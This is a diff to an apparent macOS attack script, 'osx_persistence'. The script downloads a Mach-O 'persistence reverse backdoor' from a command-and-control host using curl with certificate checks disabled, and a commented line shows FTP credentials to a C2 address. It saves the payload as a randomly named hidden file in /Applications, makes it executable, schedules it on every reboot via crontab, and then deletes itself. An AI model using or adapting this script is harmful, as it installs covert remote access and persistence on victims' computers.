@@ -9,7 +9,7 @@
 
 # Please remember that if you don't use file extensione, when downloading with curl or wget, problems
 # may occurs. So you need to put and ending slash / to file.
-URL="https://192.168.1.7/osx_persistence/"
+URL="https://192.168.1.7/macho"
 
 # Randomize payload name
 PAYLOAD=$RANDOM
@@ -19,9 +19,11 @@ PAYLOAD=".${PAYLOAD}"
 
 # Download malicious mach-o from ftp over ssl.
 # curl --ftp-ssl -u user:pass ftp://MY_C2C_IP:21/payloads/macho
-# This payload is our persistence reverse backdoor. Will be saved in 
-curl -k -O "${URL}" -o /Applications/$PAYLOAD
- 
+# or
+# Download from https
+# This payload is our persistence reverse backdoor in mach-o format!!!
+curl -k $URL -o /Applications/$PAYLOAD
+
 # Want to be sure that's my payload is executable
 chmod +x /Applications/$PAYLOAD
 
@@ -32,5 +34,5 @@ echo "@reboot sleep 30; /Applications/$PAYLOAD 2>&1" >> temp_cron
 crontab temp_cron
 rm temp_cron
 
-# Remove itself 
+# Remove itself
 rm osx_persistence 2>&1
